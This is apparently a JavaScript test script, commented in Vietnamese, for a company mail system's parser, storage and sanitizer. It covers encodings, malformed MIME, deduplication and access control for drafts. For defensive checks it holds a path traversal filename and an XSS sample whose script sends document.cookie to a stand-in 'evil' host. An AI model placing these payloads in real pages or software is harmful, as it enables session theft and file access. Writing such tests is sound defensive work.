/**
 * Phase 9 — PILOT: các trường hợp email "khó" (T9.1).
 *
 * Kiểm tra bộ đọc email + lớp lưu trữ với các email dựng sẵn:
 *  - HTML + ảnh nhúng (cid) + đính kèm thường
 *  - Tiếng Việt/emoji (header mã hoá Base64) & tiếng Hàn
 *  - Thiếu Message-ID (dedup bằng hash), trùng Message-ID (chặn ở DB)
 *  - MIME hỏng (boundary không đóng), subject rất dài, không có người gửi
 *  - Tên tệp chứa "../" (path traversal) — phải KHÔNG thoát khỏi kho NAS
 *
 * Chạy: node scratch/test_mail_pilot.js
 */
const path = require("path");
require("dotenv").config({ path: path.resolve(__dirname, "..", "outbinary", ".ENV") });
require("dotenv").config();

const PILOT_EMAIL = "pilot-mail@cmsvina.local";

let pass = 0;
let fail = 0;
const check = (name, cond, extra = "") => {
  if (cond) {
    pass += 1;
    console.log(`  ✔ ${name}`);
  } else {
    fail += 1;
    console.log(`  ✘ ${name} ${extra}`);
  }
};

/** Dựng email thô. */
function raw({ from = "Nguoi Gui <sender@cmsvina.local>", to = "pilot-mail@cmsvina.local", subject = "Chủ đề", messageId, extraHeaders = "", body }) {
  const headers = [
    `From: ${from}`,
    `To: ${to}`,
    subject.startsWith("=?") ? `Subject: ${subject}` : `Subject: ${subject}`,
    "Date: Thu, 02 Oct 2026 08:00:00 +0700",
    "MIME-Version: 1.0",
  ];
  if (messageId !== null) headers.push(`Message-ID: ${messageId || `<pilot-${Date.now()}-${Math.random().toString(36).slice(2)}@cmsvina.local>`}`);
  if (extraHeaders) headers.push(extraHeaders);
  return `${headers.join("\r\n")}\r\n\r\n${body}`;
}

const BOUNDARY = "----=_PilotBoundary";

async function main() {
  const { parseEmail, normalizeSubject, flattenRecipients } = require("../services/mail/mailParserService");
  const mailStorage = require("../services/mail/mailStorage");
  const mailRepo = require("../services/mail/mailRepository");
  const msgRepo = require("../services/mail/mailMessageRepository");

  console.log("\n=== PHASE 9 PILOT: email khó ===\n");

  // Dọn pilot cũ + tạo mailbox tạm.
  await mailRepo.queryRows(`DELETE FROM ZTB_MAIL_USERSTATE WHERE MESSAGE_ID IN (SELECT ID FROM ZTB_MAIL_MESSAGE WHERE MAIL_ACCOUNT_ID IN (SELECT ID FROM ZTB_MAIL_ACCOUNT WHERE EMAIL_ADDRESS = @E))`, { E: PILOT_EMAIL });
  await mailRepo.queryRows(`DELETE FROM ZTB_MAIL_MESSAGE WHERE MAIL_ACCOUNT_ID IN (SELECT ID FROM ZTB_MAIL_ACCOUNT WHERE EMAIL_ADDRESS = @E)`, { E: PILOT_EMAIL });
  await mailRepo.queryRows(`DELETE FROM ZTB_MAIL_SYNC_CHECKPOINT WHERE MAIL_ACCOUNT_ID IN (SELECT ID FROM ZTB_MAIL_ACCOUNT WHERE EMAIL_ADDRESS = @E)`, { E: PILOT_EMAIL });
  await mailRepo.queryRows(`DELETE FROM ZTB_MAIL_ACCOUNT WHERE EMAIL_ADDRESS = @E`, { E: PILOT_EMAIL });
  const accountId = await mailRepo.insertAccount({
    ctrCd: "002",
    emplNo: null,
    emailAddress: PILOT_EMAIL,
    displayName: "Pilot mailbox",
    pop3Host: "mail.cmsvina.local",
    pop3Port: 110,
    pop3Secure: false,
    isActive: false,
    isShared: true,
  });
  await mailRepo.ensureCheckpoint(accountId);

  /* ---------------------------------------------------------------- */
  console.log("[1] HTML tiếng Việt + ảnh nhúng cid + đính kèm thường");
  const htmlWithImage =
    `<html><body><p>Xin chào <b>anh Hùng</b> 👋</p><img src="cid:logo-cms"><p>Trân trọng.</p></body></html>`;
  const pngBase64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
  const mixed = raw({
    subject: "Báo cáo tháng 10 – hợp đồng GH68-12345 (có ảnh)",
    body:
      `--${BOUNDARY}\r
Content-Type: text/html; charset=utf-8\r
\r
${htmlWithImage}\r
--${BOUNDARY}\r
Content-Type: image/png; name="logo.png"\r
Content-Transfer-Encoding: base64\r
Content-ID: <logo-cms>\r
Content-Disposition: inline; filename="logo.png"\r
\r
${pngBase64}\r
--${BOUNDARY}\r
Content-Type: application/pdf; name="bao-cao.pdf"\r
Content-Transfer-Encoding: base64\r
Content-Disposition: attachment; filename="bao-cao.pdf"\r
\r
${Buffer.from("%PDF-1.4 pilot").toString("base64")}\r
--${BOUNDARY}--\r
`,
    extraHeaders: `Content-Type: multipart/mixed; boundary="${BOUNDARY}"`,
  });
  const parsedMixed = await parseEmail(mixed);
  check("đọc được subject có dấu", parsedMixed.subject.includes("Báo cáo tháng 10"), parsedMixed.subject);
  check("giữ nội dung HTML", /xin chào/i.test(parsedMixed.html || ""), String(parsedMixed.html || "").slice(0, 60));
  check("giữ emoji trong nội dung", (parsedMixed.html || "").includes("👋"), "emoji bị mất");
  check("tách đúng 2 đính kèm", parsedMixed.attachments.length === 2, `(${parsedMixed.attachments.length})`);
  const inline = parsedMixed.attachments.find((a) => a.contentId);
  const normal = parsedMixed.attachments.find((a) => !a.contentId);
  check("ảnh nhúng có contentId", !!inline?.contentId, JSON.stringify(inline?.contentId));
  check("ảnh nhúng có nội dung nhị phân", inline?.content?.length > 0, String(inline?.content?.length));
  check("đính kèm thường là PDF", /pdf/i.test(normal?.contentType || ""), String(normal?.contentType));
  check("có preview text", (parsedMixed.previewText || "").length > 0, String(parsedMixed.previewText));
  const recipients = flattenRecipients(parsedMixed);
  check("chuẩn hoá người nhận", recipients.some((r) => r.type === "TO" && /pilot-mail/.test(r.address || "")), JSON.stringify(recipients));

  /* ---------------------------------------------------------------- */
  console.log("[2] Tiếng Hàn + subject mã hoá Base64");
  const koreanSubject = `=?UTF-8?B?${Buffer.from("입고 지연 안내 (KO)", "utf8").toString("base64")}?=`;
  const korean = raw({
    subject: koreanSubject,
    body: `--${BOUNDARY}\r
Content-Type: text/plain; charset=utf-8\r
Content-Transfer-Encoding: base64\r
\r
${Buffer.from("안녕하세요. 입고 일정을 안내드립니다. 감사합니다.", "utf8").toString("base64")}\r
--${BOUNDARY}--\r
`,
    extraHeaders: `Content-Type: multipart/mixed; boundary="${BOUNDARY}"`,
  });
  const parsedKo = await parseEmail(korean);
  check("giải mã subject tiếng Hàn", parsedKo.subject.includes("입고 지연 안내"), parsedKo.subject);
  check("giữ nội dung tiếng Hàn", (parsedKo.text || "").includes("감사합니다"), String(parsedKo.text || "").slice(0, 60));

  /* ---------------------------------------------------------------- */
  console.log("[3] Thiếu Message-ID / không có người gửi / subject cực dài");
  const noId = raw({
    subject: "Không có Message-ID",
    messageId: null,
    body: "Nội dung không có Message-ID",
    extraHeaders: "Content-Type: text/plain; charset=utf-8",
  });
  const parsedNoId = await parseEmail(noId);
  check("email thiếu Message-ID vẫn đọc được", !parsedNoId.messageId && !!parsedNoId.subject, String(parsedNoId.messageId));

  const noFrom = raw({ from: "", subject: "Không có người gửi", body: "Nội dung", extraHeaders: "Content-Type: text/plain; charset=utf-8" });
  const parsedNoFrom = await parseEmail(noFrom);
  check("email không người gửi không crash", parsedNoFrom !== null, "parse lỗi");

  const longSubject = `Rất dài ${"X".repeat(600)}`;
  const parsedLong = await parseEmail(raw({ subject: longSubject, body: "x", extraHeaders: "Content-Type: text/plain; charset=utf-8" }));
  check(
    "subject rất dài được cắt AN TOÀN ở 500 ký tự",
    (parsedLong.subject || "").length === 500 && parsedLong.subject.startsWith("Rất dài"),
    String((parsedLong.subject || "").length)
  );

  check("normalizeSubject bỏ tiền tố Re:/Fwd: (giữ nguyên chữ hoa/thường)", normalizeSubject("Re: Fwd: Báo cáo") === "Báo cáo", normalizeSubject("Re: Fwd: Báo cáo"));
  check("normalizeSubject bỏ tiền tố tiếng Việt", normalizeSubject("Chuyển tiếp: GH68") === "GH68", normalizeSubject("Chuyển tiếp: GH68"));
  check("normalizeSubject cắt tối đa 400 ký tự", normalizeSubject("Z".repeat(600)).length === 400, String(normalizeSubject("Z".repeat(600)).length));

  /* ---------------------------------------------------------------- */
  console.log("[4] MIME hỏng (boundary không đóng)");
  const broken = raw({
    subject: "MIME hỏng",
    body: `--${BOUNDARY}\r
Content-Type: text/plain; charset=utf-8\r
\r
Nội dung vẫn đọc được dù thiếu dấu đóng`,
    extraHeaders: `Content-Type: multipart/mixed; boundary="${BOUNDARY}"`,
  });
  let brokenOk = true;
  let brokenParsed = null;
  try {
    brokenParsed = await parseEmail(broken);
  } catch (error) {
    brokenOk = false;
    console.warn(`   ! parse lỗi: ${error?.message || error}`);
  }
  check("email hỏng KHÔNG làm crash luồng đọc", brokenOk, "parse throw");
  check("vẫn lấy được tiêu đề", !!brokenParsed?.subject, String(brokenParsed?.subject));

  /* ---------------------------------------------------------------- */
  console.log("[5] Đính kèm lớn (~2MB)");
  const bigContent = Buffer.alloc(2 * 1024 * 1024, 0x41).toString("base64");
  const big = raw({
    subject: "Đính kèm lớn",
    body: `--${BOUNDARY}\r
Content-Type: text/plain; charset=utf-8\r
\r
Xem tệp đính kèm\r
--${BOUNDARY}\r
Content-Type: application/octet-stream; name="big.bin"\r
Content-Transfer-Encoding: base64\r
Content-Disposition: attachment; filename="big.bin"\r
\r
${bigContent}\r
--${BOUNDARY}--\r
`,
    extraHeaders: `Content-Type: multipart/mixed; boundary="${BOUNDARY}"`,
  });
  const parsedBig = await parseEmail(big);
  check("đọc được đính kèm ~2MB", parsedBig.attachments[0]?.content?.length >= 2 * 1024 * 1024, String(parsedBig.attachments[0]?.content?.length));

  /* ---------------------------------------------------------------- */
  console.log("[6] Tên tệp chứa đường dẫn nguy hiểm (path traversal)");
  const evilName = "../../../windows/system32/evil.txt";
  const evil = raw({
    subject: "Tên tệp nguy hiểm",
    body: `--${BOUNDARY}\r
Content-Type: text/plain; charset=utf-8\r
\r
x\r
--${BOUNDARY}\r
Content-Type: text/plain; name="${evilName}"\r
Content-Disposition: attachment; filename="${evilName}"\r
\r
noi dung nguy hiem\r
--${BOUNDARY}--\r
`,
    extraHeaders: `Content-Type: multipart/mixed; boundary="${BOUNDARY}"`,
  });
  const parsedEvil = await parseEmail(evil);
  const evilAttachment = parsedEvil.attachments[0];
  check("vẫn đọc được tên tệp nguy hiểm", !!evilAttachment, "không có đính kèm");
  const root = mailStorage.resolveMailRoot();
  const written = mailStorage.writePhysicalFile(Buffer.from(evilAttachment?.content || "x"), ".txt");
  check("file lưu trong kho theo HASH (không dùng tên gốc)", written.storagePath.includes(written.hash), written.storagePath);
  check("đường dẫn lưu nằm TRONG kho mail", written.storagePath.toLowerCase().startsWith(root.toLowerCase()), written.storagePath);
  let traversalBlocked = false;
  try {
    mailStorage.openReadStream(path.join(root, "..", "..", "windows", "win.ini"));
  } catch {
    traversalBlocked = true;
  }
  check("chặn đọc file ngoài kho (traversal guard)", traversalBlocked, "KHÔNG chặn!");
  mailStorage.removeFile(written.storagePath);

  /* ---------------------------------------------------------------- */
  console.log("[7] Chống trùng: Message-ID trùng & thiếu Message-ID");
  const dupMessageId = `<pilot-dup-${Date.now()}@cmsvina.local>`;
  const first = await mailRepo.withTransaction((tx) =>
    msgRepo.insertMessage(tx, {
      mailAccountId: accountId,
      messageId: dupMessageId,
      uidl: `UIDL-PILOT-${Date.now()}`,
      fromAddress: "sender@cmsvina.local",
      subject: "Bản gốc",
      receivedAt: new Date(),
      folder: "INBOX",
      bodyInline: "<p>gốc</p>",
      previewText: "gốc",
    })
  );
  check("chèn email pilot OK", Number(first) > 0, String(first));
  const found = await msgRepo.findMessageByDedup({ accountId, messageId: dupMessageId, uidl: "UIDL-KHAC", contentHash: null });
  check("tìm thấy bản ghi theo Message-ID (dedup)", !!found?.ID, JSON.stringify(found || {}).slice(0, 80));

  let duplicateBlocked = false;
  try {
    await mailRepo.withTransaction((tx) =>
      msgRepo.insertMessage(tx, {
        mailAccountId: accountId,
        messageId: dupMessageId,
        uidl: `UIDL-PILOT-DUP-${Date.now()}`,
        fromAddress: "sender@cmsvina.local",
        subject: "Bản trùng",
        receivedAt: new Date(),
        folder: "INBOX",
      })
    );
  } catch (error) {
    duplicateBlocked = true;
  }
  check("DB CHẶN chèn trùng Message-ID (unique index)", duplicateBlocked, "đã chèn được trùng!");

  const noIdRow = await mailRepo.withTransaction((tx) =>
    msgRepo.insertMessage(tx, {
      mailAccountId: accountId,
      messageId: null,
      uidl: null,
      fromAddress: "sender@cmsvina.local",
      subject: "Không Message-ID",
      receivedAt: new Date(),
      folder: "INBOX",
      bodyInline: "<p>x</p>",
      contentHash: "pilot-hash-1",
    })
  );
  const foundByHash = await msgRepo.findMessageByDedup({ accountId, messageId: null, uidl: null, contentHash: "pilot-hash-1" });
  check("thiếu Message-ID ⇒ dedup bằng hash", foundByHash?.ID === Number(noIdRow), `${foundByHash?.ID} vs ${noIdRow}`);

  /* ---------------------------------------------------------------- */
  console.log("[8] Security: lọc HTML nguy hiểm trước khi GỬI");
  const { sanitizeOutboundHtml } = require("../services/mail/mailHtmlSanitize");
  const dirty =
    `<p onclick="steal()">Xin chào</p>` +
    `<script>fetch('http://evil/'+document.cookie)</script>` +
    `<iframe src="http://evil"></iframe>` +
    `<a href="javascript:alert(1)">bấm</a>` +
    `<a href="https://cmsbando.com">link hợp lệ</a>` +
    `<img src="data:image/png;base64,iVBORw0KGgo=">` +
    `<img src="data:text/html;base64,PHNjcmlwdD4=">` +
    `<div style="expression(alert(1))">styled</div>` +
    `<table border="1" style="border-collapse:collapse"><tr><td style="border:1px solid #000">Ô</td></tr></table>`;
  const cleaned = sanitizeOutboundHtml(dirty);
  const out = cleaned.html;
  check("bỏ thẻ <script>", !/<script/i.test(out), out.slice(0, 80));
  check("bỏ <iframe>", !/<iframe/i.test(out));
  check("bỏ thuộc tính sự kiện onclick", !/onclick/i.test(out));
  check("vô hiệu javascript: trong href", !/javascript:/i.test(out));
  check("vô hiệu data:text/html", !/data:\s*text\/html/i.test(out));
  check("vô hiệu CSS expression()", !/expression\s*\(/i.test(out));
  check("GIỮ link https hợp lệ", out.includes('href="https://cmsbando.com"'), out.slice(0, 120));
  check("GIỮ ảnh data:image", out.includes("data:image/png;base64"), "ảnh bị mất");
  check("GIỮ bảng + style hợp lệ", /<table/i.test(out) && /border-collapse/i.test(out), "bảng bị mất");
  check("báo cáo số vector đã lọc", cleaned.removed.blocks >= 2 && cleaned.removed.events >= 2 && cleaned.removed.urls >= 2, JSON.stringify(cleaned.removed));

  console.log("[9] Security: nháp của người khác KHÔNG đọc/xoá được (IDOR)");
  const mailSendService = require("../services/mail/mailSendService");
  const draftId = await mailRepo.saveDraft({
    ctrCd: "002",
    emplNo: "NHU1903",
    subject: "Nháp riêng tư",
    bodyHtml: "<p>bí mật</p>",
    toJson: "[]",
    ccJson: "[]",
    bccJson: "[]",
    attachJson: "[]",
  });
  check("tạo được nháp test", Number(draftId) > 0, String(draftId));
  const call = (handler, payload, data) =>
    new Promise((resolve) => handler({ payload_data: payload }, { send: (result) => resolve(result) }, data));
  const asOther = await call(mailSendService.emailDraftGet, { EMPL_NO: "ZTEST01", CTR_CD: "002" }, { ID: draftId });
  check("người khác đọc nháp ⇒ NOT_FOUND", asOther.tk_status === "NG" && asOther.code === "NOT_FOUND", JSON.stringify(asOther).slice(0, 120));
  const asOwner = await call(mailSendService.emailDraftGet, { EMPL_NO: "NHU1903", CTR_CD: "002" }, { ID: draftId });
  check("chủ nháp đọc được", asOwner.tk_status === "OK" && !!asOwner.data?.id, JSON.stringify(asOwner).slice(0, 120));
  await call(mailSendService.emailDeleteDraft, { EMPL_NO: "ZTEST01", CTR_CD: "002" }, { ID: draftId });
  const stillThere = await mailRepo.getDraft(draftId, { emplNo: "NHU1903" });
  check("người khác KHÔNG xoá được nháp", !!stillThere, "nháp đã bị xoá!");
  await mailRepo.deleteDraft({ id: draftId, emplNo: "NHU1903" });
  const gone = await mailRepo.getDraft(draftId, { emplNo: "NHU1903" });
  check("chủ nháp xoá được", !gone, "chưa xoá");

  /* ---------------------------------------------------------------- */
  console.log("[10] Dọn dẹp + đối soát kho NAS");
  await mailRepo.queryRows(`DELETE FROM ZTB_MAIL_USERSTATE WHERE MESSAGE_ID IN (SELECT ID FROM ZTB_MAIL_MESSAGE WHERE MAIL_ACCOUNT_ID = @A)`, { A: accountId });
  await mailRepo.queryRows(`DELETE FROM ZTB_MAIL_MESSAGE WHERE MAIL_ACCOUNT_ID = @A`, { A: accountId });
  await mailRepo.queryRows(`DELETE FROM ZTB_MAIL_SYNC_CHECKPOINT WHERE MAIL_ACCOUNT_ID = @A`, { A: accountId });
  await mailRepo.queryRows(`DELETE FROM ZTB_MAIL_ACCOUNT WHERE ID = @A`, { A: accountId });
  const { reconcile } = require("../services/mail/mailReconcile");
  const reconciled = await reconcile({ limit: 500 });
  check("đối soát chạy không lỗi", typeof reconciled.orphans === "number", JSON.stringify(reconciled));
  check("không còn file thiếu sau pilot", Number(reconciled.failed) === 0, String(reconciled.failed));

  const { openConnection } = require("../config/database");
  (await openConnection()).close();

  console.log(`\n=== KẾT QUẢ: ${pass} PASS, ${fail} FAIL ===`);
  if (fail > 0) process.exitCode = 1;
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
